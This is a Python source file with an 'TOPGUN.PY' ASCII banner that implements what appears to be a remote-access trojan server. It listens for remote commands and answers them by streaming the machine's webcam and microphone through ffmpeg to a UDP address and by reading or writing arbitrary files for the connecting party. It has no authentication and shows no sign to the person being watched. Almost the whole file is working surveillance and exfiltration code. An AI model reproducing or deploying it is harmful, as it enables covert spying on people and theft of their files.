import socket
import subprocess
import threading
import os


print(''' 
                                                                                                                                                                                   
__________   ____   ________      ____   ____     ______      ___    ________  ____     ___ 
MMMMMMMMMM  6MMMMb  `MMMMMMMb.   6MMMMb/ `MM'     `M'`MM\     `M'    `MMMMMMMb.`MM(     )M' 
/   MM   \ 8P    Y8  MM    `Mb  8P    YM  MM       M  MMM\     M      MM    `Mb `MM.    d'  
    MM    6M      Mb MM     MM 6M      Y  MM       M  M\MM\    M      MM     MM  `MM.  d'   
    MM    MM      MM MM     MM MM         MM       M  M \MM\   M      MM     MM   `MM d'    
    MM    MM      MM MM    .M9 MM         MM       M  M  \MM\  M      MM    .M9    `MM'     
    MM    MM      MM MMMMMMM9' MM     ___ MM       M  M   \MM\ M      MMMMMMM9'     MM      
    MM    MM      MM MM        MM     `M' MM       M  M    \MM\M      MM            MM      
    MM    YM      M9 MM        YM      M  YM       M  M     \MMM      MM            MM      
    MM     8b    d8  MM         8b    d9   8b     d8  M      \MM 68b  MM            MM      
   _MM_     YMMMM9  _MM_         YMMMM9     YMMMMM9  _M_      \M Y89 _MM_          _MM_     
                                                                                            
                                                                                            
''')


# Settings
HOST = '127.0.0.2'
PORT = 9965

def handle_client(client_socket):
    while True:
        command = client_socket.recv(1024).decode('utf-8')
        if command == 'exit':
            print("Client disconnected.")
            break

        elif command.startswith('Open-Camera'):
            open_camera(client_socket)

        elif command.startswith('Open-Microphone'):
            open_microphone(client_socket)

        elif command.startswith('Upload-Files'):
            file_path = command.split(':')[1]
            receive_file(client_socket, file_path)

        elif command.startswith('Download-Files'):
            output_path = command.split(':')[1]
            send_file(client_socket, output_path)

        else:
            print("Unknown command received.")

    client_socket.close()

def open_camera(client_socket):
    try:
        subprocess.Popen(['ffmpeg', '-f', 'dshow', '-i', 'video=0', '-f', 'mpegts', 'udp://127.0.0.2:9999'])
        client_socket.send(b'Camera opened and streaming to the server.')
    except Exception as e:
        client_socket.send(f'Error opening camera: {str(e)}'.encode())

def open_microphone(client_socket):
    try:
        subprocess.Popen(['ffmpeg', '-f', 'dshow', '-i', 'audio=Microphone', '-f', 'mpegts', 'udp://127.0.0.2:9998'])
        client_socket.send(b'Microphone opened and streaming to the server.')
    except Exception as e:
        client_socket.send(f'Error opening microphone: {str(e)}'.encode())

def receive_file(client_socket, file_path):
    try:
        with open(file_path, 'wb') as file:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                file.write(data)
        client_socket.send(b'File received successfully.')
    except Exception as e:
        client_socket.send(f'Error receiving file: {str(e)}'.encode())

def send_file(client_socket, output_path):
    try:
        if os.path.exists(output_path):
            with open(output_path, 'rb') as file:
                client_socket.sendall(file.read())
            client_socket.send(b'File sent successfully.')
        else:
            client_socket.send(b'Error: File not found.')
    except Exception as e:
        client_socket.send(f'Error sending file: {str(e)}'.encode())

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f'Server listening on {HOST}:{PORT}')

    while True:
        client_socket, addr = server.accept()
        print(f'Connection from {addr} established.')
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    start_server()
